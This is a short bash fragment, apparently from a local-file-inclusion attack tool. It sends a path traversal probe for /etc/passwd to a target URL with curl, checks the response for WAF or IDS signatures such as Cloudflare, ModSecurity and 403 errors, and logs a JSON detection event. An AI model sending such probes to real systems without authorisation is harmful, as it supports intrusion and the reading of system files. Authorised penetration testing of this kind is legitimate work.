...
echo "--- Layer 0: WAF/IDS detection ---"
WAF_DETECTED=false
WAF_PROBE_URL="$BASE/?page=../../etc/passwd"
waf_result=$(curl -s -i "$WAF_PROBE_URL" --max-time 5 2>/dev/null)
waf_headers=$(echo "$waf_result" | head -20)
waf_body=$(echo "$waf_result" | tail -n +2)

# Check for common WAF signatures
if echo "$waf_headers" | grep -qiE '(cf-ray|__cfduid|cloudflare|ModSecurity|mod_security|NAXSI|Blocked|Access Denied|403 Forbidden|not acceptable)'; then
    WAF_DETECTED=true
    echo "[WAF] 检测到 WAF/IDS 特征: $(echo "$waf_headers" | grep -iE '(cf-ray|ModSecurity|NAXSI|Blocked)' | head -1)"
fi
# Check for 403 on simple path traversal
if echo "$waf_headers" | grep -q "HTTP.* 403"; then
    WAF_DETECTED=true
    echo "[WAF] 403 Forbidden on path traversal probe → WAF likely active"
fi
echo "{\"event\":\"lfi_waf_detected\",\"payload\":{\"waf_detected\":$WAF_DETECTED}}"
